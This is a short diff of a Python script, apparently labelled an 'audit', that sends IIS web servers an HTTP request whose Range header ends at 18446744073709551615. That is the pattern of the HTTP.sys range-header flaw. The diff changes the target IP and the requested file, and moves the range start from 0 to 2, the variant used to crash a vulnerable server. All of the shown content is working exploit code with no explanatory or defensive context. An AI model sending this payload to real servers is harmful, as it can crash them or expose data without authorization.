@@ -27,11 +27,11 @@ an HTTP range request.
 import socket
 import random
 
-ipAddr = "192.168.199.138"
+ipAddr = "192.168.1.122"
 hexAllFfff = "18446744073709551615"
 
-req1 = "GET /iisstart.htm HTTP/1.0\r\n\r\n"
-req = "GET /iisstart.htm HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n"
+req1 = "GET /welcome.png HTTP/1.0\r\n\r\n"
+req = "GET /welcome.png HTTP/1.1\r\nHost: stuff\r\nRange: bytes=2-" + hexAllFfff + "\r\n\r\n"
 
 print "[*] Audit Started"
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
